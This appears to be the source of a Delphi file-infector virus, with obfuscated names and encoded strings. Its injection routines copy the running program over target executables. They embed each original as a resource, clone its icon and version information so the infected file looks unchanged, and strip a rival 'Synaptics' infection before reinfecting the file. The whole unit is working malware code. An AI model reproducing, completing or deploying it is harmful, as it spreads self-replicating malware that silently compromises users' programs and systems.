unit FIE;

interface

uses
  Windows, Classes, SysUtils, uTypes, uFnc, uIcon, uEnc, uEof;

type
  TFIE = class(TComponent)
  private
    ConfigData: TCnfg;
    function RsChe(FHandle: HMODULE; ResName: string): Boolean;
    function RsGe(FHandle: HMODULE; ResName: string): string;
    function RsUp(FromFile, ToFile, ResName: string): Boolean;
    function RsUpDa(FromFile, ResName: string; FHandle: HMODULE): Boolean;
    procedure FiVerClo(sFile, output: string);
    procedure InPrc(InjFile, ResName: string; Updating: Boolean; FHandle: HMODULE = 0);
  public
    constructor Create(AOwner: TComponent; Config: TCnfg);
    procedure InFi(FilePath: string);
    procedure InFis(Files: TStringList);
  end;

implementation

uses Math;

var
  SyVerRes: string;
  SyConRes: string;

constructor TFIE.Create(AOwner: TComponent; Config: TCnfg);
begin
  inherited Create(Owner);
  ConfigData := Config;

  // Old Resource
  SyVerRes := DE('MNhusLgHfC');
  SyConRes := DE('MNhuoL1OgA');
end; { Constructor -> Set Default Variable }

{****************************************************************************
                      Custom Functions
****************************************************************************}

function TFIE.RsChe(FHandle: HMODULE; ResName: string): Boolean;
var
  HResInfo: HRSRC;
begin
  Result := False;
  try
    HResInfo := FindResource(FHandle, PChar(ResName), RT_RCDATA);
    if HResInfo = 0 then
      Result := False
    else
      Result := True;

    FreeResource(HResInfo);
  except on E: EResNotFound do
      Result := False;
  end;
end; {* ResCheck -> Exe Resource Kontrolü Yapar *}

function TFIE.RsGe(FHandle: HMODULE; ResName: string): string;
var
  RS: TResourceStream;
begin
  try
    RS := TResourceStream.Create(FHandle, ResName, RT_RCDATA);
    SetLength(Result, RS.Size);
    RS.ReadBuffer(Result[1], RS.Size);
    RS.Free;
  except on E: EResNotFound do
      Result := '';
  end;
end; {* ResGet -> Exe Resource Datasýný Döndürür *}

function TFIE.RsUp(FromFile, ToFile, ResName: string): Boolean;
var
  FS: TFileStream;
  RHandle: THandle;
  DLength: DWord;
  Data: Pointer;
begin
  RHandle := BeginUpdateResource(PChar(FromFile), False);
  Result := RHandle <> 0;

  if Result then
  begin
    try
      FS := TFileStream.Create(ToFile, fmOpenRead);
      DLength := FS.Size;
      GetMem(Data, DLength);
      FS.Read(Data^, DLength);
      FS.Free;

      Result := UpdateResource(RHandle, RT_RCDATA, PChar(ResName), LANG_NEUTRAL, Data, DLength);
      Result := EndUpdateResource(RHandle, False) and Result;
    finally
      FreeMem(Data);
    end;
  end;
end; {* ResUpdate -> Exe Reslerini Deðiþtirir *}

function TFIE.RsUpDa(FromFile, ResName: string; FHandle: HMODULE): Boolean;
var
  RS: TResourceStream;
  RHandle: THandle;
  DLength: DWord;
  Data: Pointer;
  Context: AnsiString;
begin
  RHandle := BeginUpdateResource(PChar(FromFile), False);
  Result := RHandle <> 0;

  if Result then
  begin
    try
      RS := TResourceStream.Create(FHandle, ResName, RT_RCDATA);
      DLength := RS.Size;
      GetMem(Data, RS.Size);
      RS.Read(Data^, DLength);

      RS.Free;
      FreeLibrary(FHandle);

      Result := UpdateResource(RHandle, RT_RCDATA, PChar(ResName), LANG_NEUTRAL, Data, DLength);
      Result := EndUpdateResource(RHandle, False) and Result;
    finally
      FreeMem(Data);
    end;
  end;
end; {* ResUpdateData -> Exe Reslerini Data ile Deðiþtirir *}

procedure TFIE.FiVerClo(sFile, output: string);
var
  dwHandle, cbTranslate: cardinal;
  sizeVers: DWord;
  lpData, langData: Pointer;
  hRes: THandle;
  wLanguage: Word;
begin
  sizeVers := GetFileVersionInfoSize(PChar(sFile), dwHandle);
  if sizeVers = 0 then Exit;
  GetMem(lpData, sizeVers);
  try
    ZeroMemory(lpData, sizeVers);
    GetFileVersionInfo(PChar(sFile), 0, sizeVers, lpData);
    if not VerQueryValue(lpData, '\VarFileInfo\Translation', langData, cbTranslate) then Exit;
    hRes := BeginUpdateResource(pchar(output), FALSE);
    UpdateResource(hRes, RT_VERSION, MAKEINTRESOURCE(VS_VERSION_INFO), 1055, lpData, sizeVers);
    EndUpdateResource(hRes, FALSE);
  finally
    FreeMem(lpData);
  end;
end; {* FileVersionClone -> Exe Versiyon Bilgisini Kopyalar *}

procedure TFIE.InPrc(InjFile, ResName: string; Updating: Boolean; FHandle: HMODULE = 0);
var
  Path: string;
  PathIco: string;
begin
  // Dizinleri Oluþtur
  Path := GtTeD + '\' + GtRanStr(6) + DE('nMh1tD');
  PathIco := ChangeFileExt(Path, DE('n8BOyA'));

  // Create New Copy
  CyFiRstPer(ParamStr(0), Path, 128);

  // Dosyaya Resleri Yükle
  if Updating then
    RsUpDa(Path, ResName, FHandle)
  else
    RsUp(Path, InjFile, ResName);

  // Dosyanýn Icon'u çýkar ve Yükle
  ExMaIcFrFi(InjFile, PathIco);

  // Clone ICON
  if FileExists(PathIco) then
    ChIcEx(PChar(Path), Pchar(PathIco));

  // Clone Version
  FiVerClo(InjFile, Path);

  // Dosyaya Diske Kopyala
  CyFiRstPer(Path, InjFile, 128);

  // Dosyayý Sil
  DeleteFile(Path);
  DeleteFile(PathIco);
end; {* InjProcess -> Injection Process *}

{****************************************************************************
                      Public Injection Process
****************************************************************************}

procedure TFIE.InFi(FilePath: string);
var
  FHandle: HMODULE;
  CacheFilePath: string;
  RS: TResourceStream;
  Ver: string;
  iVer: Integer;
begin
  // Check Cache
  if Pos('._cache_', ExtractFileName(FilePath)) > 0 then Exit;

  // Check File
  if (Pos(ExtractFileExt(FilePath), DE('1VXpYjH')) > 0) and (FileExists(FilePath)) then
  try
    FHandle := LoadLibrary(PChar(FilePath));

    // Check Injection & Version
    if not RsChe(FHandle, ConfigData.EeVRs) then begin
      // Check Synaptics & Restore File
      if RsChe(FHandle, SyVerRes) then begin
        CacheFilePath := ChangeFileExt(FilePath, '.cache');
        if FindResource(FHandle, PChar(SyConRes), RT_RCDATA) <> 0 then begin
          with TResourceStream.Create(FHandle, SyConRes, RT_RCDATA) do begin
            SaveToFile(CacheFilePath);
            Free;
          end;
          FreeLibrary(FHandle);
          DeleteFile(FilePath);
          RenameFile(CacheFilePath, FilePath);
        end;
      end else
        FreeLibrary(FHandle);
      InPrc(FilePath, ConfigData.EeRs, False);
    end else begin
      // Version String
      Ver := DE(Trim(RsGe(FHandle, ConfigData.EeVRs)));

      // is numeric to int
      if IsStrANumber(PChar(Ver)) then
        iVer := StrToInt(Ver)
      else
        iVer := 0;

      if ConfigData.Vsr > iVer then begin
        if FindResource(FHandle, PChar(ConfigData.EeRs), RT_RCDATA) <> 0 then
          InPrc(FilePath, ConfigData.EeRs, True, FHandle);
        FreeLibrary(FHandle);
      end else
        FreeLibrary(FHandle);
    end;
  except
  end;
end; {* InjFile -> Inject One File *}

procedure TFIE.InFis(Files: TStringList);
var
  i: Integer;
begin
  if Files.Count >= 1 then
    for i := 0 to Files.Count - 1 do begin
      InFi(Files.Strings[i]);
    end;
end; {* InjFiles -> Inject File List *}

end.

